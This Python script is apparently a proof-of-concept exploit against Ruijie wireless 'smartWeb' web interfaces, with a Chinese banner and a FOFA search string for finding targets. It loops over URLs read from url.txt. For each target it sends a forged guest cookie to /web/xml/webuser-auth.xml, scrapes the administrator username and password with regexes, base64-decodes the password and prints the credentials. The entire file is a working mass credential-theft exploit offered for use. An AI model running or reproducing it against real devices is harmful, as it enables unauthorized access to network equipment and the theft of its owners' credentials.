import requests
import sys
import random
import re
import base64
import time
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
        print('+------------------------------------------')
        print('+  \033[31m公众号 : 深夜笔记本                                                  \033[0m')
        print('+  \033[31mVersion: 锐捷无线                                              \033[0m')
        print('+  \033[31m使用格式:  python3 poc.py                                           \033[0m')
        print('+  \033[31mVersion: fofa：title="无线smartWeb"                                 \033[0m')
        print('+  \033[31m保存连接到url.txt                                                    \033[0m')
        print('+------------------------------------------')

def POC_1(target_url):
    url = target_url +'/web/xml/webuser-auth.xml'
    headers = {
        'Cookie': 'auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302'
    }
    try:
        r = requests.get(url=url, headers=headers, timeout=10, verify=False)
        data = r.text
        if r.status_code == 200 and 'Authorization Required' not in data:
            webuser = re.search(r'<user><name><!\[CDATA\[   (.*?)\]\]></name>', data, re.M | re.I)  # 正则匹配
            if webuser:
                print("\033[32m[o] 登陆地址 {}\033[0m".format(target_url))
                print("\033[31m账号：" + webuser.group(1))
            wbasspass = re.search(r'<password><!\[CDATA\[   (.*?)\]\]></password>', data, re.M | re.I)  # 正则匹配
            if wbasspass:
                mima = wbasspass.group(1)
                temp = base64.b64decode(mima)
                print("\033[31m密码：" + temp.decode())
                print('__' * 25)
        else:
            print("漏洞不存在")
    except:
        print("目标有误")


if __name__=="__main__":
    title()
    with open('./poc/url.txt', 'r', encoding='utf-8') as f:
        for i in f.readlines():
            s = i.strip()
            target_url = s
            POC_1(target_url)
